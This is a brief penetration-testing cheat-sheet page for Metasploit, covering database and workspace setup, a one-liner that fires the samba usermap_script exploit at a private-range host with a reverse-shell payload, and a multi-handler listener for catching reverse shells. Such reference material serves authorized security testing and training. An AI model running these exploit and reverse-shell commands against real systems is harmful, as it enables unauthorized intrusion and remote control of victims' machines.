---
title: "metasploit"
description: "a tool for developing and executing exploit code against a remote target machine."
pre: "<i class='far fa-folder'></i> "
date: 2020-03-06T13:01:48+01:00
draft: false
tags: ['Frameworks','post-exploitation','metasploit']
---

### Install

### Usage

```bash
msfconsole
```

### Examples

#### init database

```bash
msfdb init
```

#### create new workspace

```bash
workspace -a [name]
```

#### switch to workspace

```bash
workspace [name]
```

#### run commands without interactive shell

```bash
msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```

#### Multi-handler for reverse shell

```bash
use exploit/multi/handler
set LHOST 192.168.88.128
set LPORT 4444
set ExitOnSession False
```

##### netcat/bash reverse

```bash
set PAYLOAD linux/x86/shell/reverse_tcp
```

##### run in the background

```bash
run -j
```

### Also see

* [Github Project](https://github.com/rapid7/metasploit-framework)
* [metasploit-unleashed](https://www.offensive-security.com/metasploit-unleashed/)
